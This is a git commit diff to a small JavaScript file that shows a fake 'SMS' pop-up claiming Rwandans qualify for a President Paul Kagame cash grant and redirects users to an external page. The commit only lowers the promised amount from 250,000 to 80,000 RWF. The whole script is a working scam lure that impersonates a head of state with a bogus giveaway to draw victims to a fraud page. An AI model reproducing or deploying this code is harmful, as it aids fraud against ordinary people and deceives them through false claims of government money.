e5ddf933a832cbdc0558033541543e464fe2fba0
boss-bloq <nsisboy01@gmail.com>
2024-11-17 00:22:27 -0800

    Update paul.js

--- paul.js
+++ paul.js
@@ -1,6 +1,6 @@
 
-var password = 'WITHDRAW 250,000RWF'
-password=prompt('SMS: Congratulations You are qualify for President Paul Kagame 250,000RWF Birthday Cash Grant for Rwandese, Kindly Press OK to Withdraw Cash Prize   ','WITHDRAW 250,000RWF');
-if (password != 'WITHDRAW 250,000RWF') {
+var password = 'WITHDRAW 80,000RWF'
+password=prompt('SMS: Congratulations You are qualify for President Paul Kagame 80,000RWF Cash Grant for Rwandese, Kindly Press OK to Withdraw Cash Prize   ','WITHDRAW 80,000RWF');
+if (password != 'WITHDRAW 80,000RWF') {
 location.href='https://damba-fest.org/paul-birthday.html';
 }
